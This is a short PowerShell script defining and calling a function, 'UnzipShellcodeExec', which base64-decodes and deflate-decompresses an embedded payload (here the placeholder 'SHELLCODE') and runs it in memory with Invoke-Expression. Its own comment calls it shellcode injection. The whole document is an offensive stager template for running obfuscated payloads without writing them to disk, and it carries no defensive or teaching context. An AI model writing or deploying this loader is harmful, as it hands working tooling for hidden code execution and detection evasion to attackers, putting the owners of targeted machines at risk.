function UnzipShellcodeExec
{
# this is our shellcode injection into memory (one liner)

[byte[]]$byteArray = [System.Convert]::FromBase64String("SHELLCODE")
 $input = New-Object System.IO.MemoryStream( , $byteArray )

 $deflateStream = New-Object System.IO.Compression.DeflateStream $input, ([System.IO.Compression.CompressionMode]::Decompress)
 $sr = New-Object System.IO.StreamReader($deflateStream,[System.Text.Encoding]::ASCII);
 $t = $sr.readtoend()

 $deflateStream.Close()
 $input.Close()
 $sr.Close()
 #write-output $t
 Invoke-Expression $t
}
UnzipShellcodeExec